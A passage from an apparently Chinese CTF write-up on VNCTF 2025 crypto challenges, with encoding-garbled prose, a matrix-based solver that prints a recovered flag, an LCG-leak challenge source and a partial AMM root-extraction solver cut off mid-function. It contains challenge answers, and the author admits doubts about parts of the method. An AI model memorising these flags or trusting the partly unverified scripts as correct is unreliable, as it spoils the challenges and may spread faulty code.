style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></p><p>ï¼ˆç„¶åå°±çœ‹ä¸æ‡‚äº†ï¼ŒåŸç†ä¸€æ ·ï¼Œè„šæœ¬ä¹Ÿä¸€æ ·ï¼‰</p><p><img src="/imgs/vnctf2025/2.png" alt="1" /></p><p>ï¼ˆæœ€åç»“æœé«˜ä½æœ‰ç‚¹é—®é¢˜ï¼Œçœ‹ä¸æ‡‚æ‰¾ä¸å‡ºåŸå› ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span><br>G = Zmod(p)<br><br><br>L = Matrix(Zmod(p),[<br>    [<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">5</span>],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]<br>])<br>vec1 = (<span class="hljs-number">2025</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>)<br>vec2 = (<span class="hljs-number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>, <span class="hljs-number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>, <span class="hljs-number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>)<br><br>vec1 = vector(Zmod(p),vec1)<br>vec2 = vector(Zmod(p),vec2)<br><br>M1 = Matrix(Zmod(p),Matrix(vec1).T)<br>M1 = M1.augment(L*vec1)<br>M1 = M1.augment(L^<span class="hljs-number">2</span>*vec1)<br><br>M2 = Matrix(Zmod(p),Matrix(vec2).T)<br>M2 = M2.augment(L*vec2)<br>M2 = M2.augment(L^<span class="hljs-number">2</span>*vec2)<br><br>R = M2*M1^(-<span class="hljs-number">1</span>)<br><br>gl, P = L.jordan_form(transformation=<span class="hljs-literal">True</span>)<br>gr = P^(-<span class="hljs-number">1</span>)*R*P<br><br>g = gl[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>] <br>t = gr[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] <span class="hljs-comment"># t = ng^(n-1)</span><br>k = gr[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>] <span class="hljs-comment"># k = g^n</span><br><span class="hljs-comment">#so gt = nk  -&gt;  n = gtk^(-1)</span><br><br>n = g * t * inverse(k,p) % p<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(n)))<br><span class="hljs-comment">#b&#x27;\xd6NCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;&#x27;</span><br><span class="hljs-comment">#VNCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="simple-prediction"><a class="markdownIt-Anchor" href="#simple-prediction"></a> Simple prediction</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice, randint<br><br><span class="hljs-comment"># flagæ¥æº</span><br>flag = <span class="hljs-string">b&quot;VNCTF&#123;xxxxxxx&#125;&quot;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)&lt;<span class="hljs-number">100</span><br>FLAG1=flag[:<span class="hljs-number">32</span>]<br>FLAG2=flag[<span class="hljs-number">32</span>:]<br><br><span class="hljs-comment"># part1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed=<span class="hljs-literal">None</span>, a=<span class="hljs-literal">None</span>, b=<span class="hljs-literal">None</span>, m=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> m:<br>            <span class="hljs-variable language_">self</span>.m = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seed:<br>            <span class="hljs-variable language_">self</span>.seed = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a:<br>            <span class="hljs-variable language_">self</span>.a = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> b:<br>            <span class="hljs-variable language_">self</span>.b = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-comment">#print(f&quot;LCG åˆå§‹åŒ–å‚æ•°: seed=&#123;self.seed&#125;\n a=&#123;self.a&#125;\n b=&#123;self.b&#125;\n m=&#123;self.m&#125;&quot;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.m,<span class="hljs-variable language_">self</span>.seed,<span class="hljs-variable language_">self</span>.a,<span class="hljs-variable language_">self</span>.b)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.seed = (<span class="hljs-variable language_">self</span>.seed * <span class="hljs-variable language_">self</span>.a + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.m<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.seed<br>binary_flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;byte:08b&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> FLAG1)<br>m = [<span class="hljs-built_in">int</span>(bit) <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> binary_flag]<br><br>n=[]<br>lcg=LCG()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    z=lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>        n.append(z)<br>    <span class="hljs-keyword">else</span>:<br>        z=randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**<span class="hljs-number">512</span>)<br>        n.append(z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># part2</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagEncoder</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, flag: <span class="hljs-built_in">bytes</span>, e: <span class="hljs-built_in">int</span> = <span class="hljs-number">65537</span></span>):<br>        <span class="hljs-variable language_">self</span>.flag = flag<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.encoded_flag = []<br>        <span class="hljs-variable language_">self</span>.n = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.c = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> idx, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-variable language_">self</span>.flag):<br>            <span class="hljs-variable language_">self</span>.encoded_flag.extend([idx + <span class="hljs-number">0x1234</span>] * byte)<br>        shuffle(<span class="hljs-variable language_">self</span>.encoded_flag)<br>        p, q = getPrime(<span class="hljs-number">1024</span>), getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.n = p * q<br>        <span class="hljs-variable language_">self</span>.c = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">pow</span>(m, <span class="hljs-variable language_">self</span>.e, <span class="hljs-variable language_">self</span>.n) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.encoded_flag) % <span class="hljs-variable language_">self</span>.n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.n = &#125;</span>\n<span class="hljs-subst">&#123;self.e = &#125;</span>\n<span class="hljs-subst">&#123;self.c = &#125;</span>\n&quot;</span>)<br><br>encoder = FlagEncoder(FLAG2)<br>encoder.process()<br></code></pre></td></tr></table></figure><h3 id="part1"><a class="markdownIt-Anchor" href="#part1"></a> part1</h3><p>LCGä½†ä¸æ˜¯è¿ç€çš„ï¼Œå½“flagçš„äºŒè¿›åˆ¶ä¸º1æ—¶ï¼Œæˆ‘ä»¬æ²¡æœ‰è¿™ä¸ªæ•°æ®äº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¿ç€çš„æ•°æ®ï¼Œå½“ç„¶è·³è¿‡ä¸€æ¬¡çš„ä¹Ÿç®—è¿ç€</p><p>ä¾‹å¦‚ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup><msub><mi>s</mi><mi>i</mi></msub><mo>+</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">s_{i+2}=a^2s_i+ab+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>ï¼Œæˆ‘ä»¬å¯å‡è®¾<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a=a^2,b=ab+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªLCG</p><p>æˆ‘ä»¬è¿˜çŸ¥é“flagå¤´ä¸º<code>VNCTF&#123;</code>ï¼ŒäºŒè¿›åˆ¶ä¸º<code>010101100100111001000011010101000100011001111011</code></p><p>é€šè¿‡æ‰‹åŠ¨æ‰“è¡¨ï¼Œåˆ°æœ€åä¸€ä¸²<code>000</code>è¿™æ—¶ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€å¤§ä¸²è¿ç€çš„æ•°æ®ï¼ˆå‰é¢ä¹Ÿæœ‰è¿ç€çš„æ•°æ®ï¼Œä½†ä¸å¤Ÿå¤šï¼Œæˆ–è€…è¯•äº†æ²¡ç”¨ï¼‰</p><p>åˆ©ç”¨è¿™6ç»„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æ±‚å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>æ¨¡æ•°</mtext><mi>p</mi><mo separator="true">,</mo><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mn>25</mn></msub></mrow><annotation encoding="application/x-tex">æ¨¡æ•°p,a^2,ab+b,seed_{25}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">æ¨¡</span><span class="mord cjk_fallback">æ•°</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œåªæœ‰pæ˜¯åŸæ¥çš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿˜åŸå‡ºåŸæ¥çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">a,b,seed</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span></span></span></span>ï¼Œé€šè¿‡ä¹‹å‰ä¸€é¢˜ï¼Œæˆ‘ç›´æ¥ç”¨AMMæ¥å¼€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">a^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>äº†ï¼Œç„¶å<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">b,seed_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>å°±è¿åˆƒè€Œè§£äº†ï¼ˆæœ€åˆçš„seedç”¨ç¬¬ä¸€ä¸ªæ•°æ®å°±å¥½äº†ï¼‰</p><p>ç„¶åç›´æ¥æ­£ç€åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰å°±ä»£è¡¨æ­¤ä½ä¸º0</p><p><img src="/imgs/vnctf2025/3.jpg" alt="1" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = 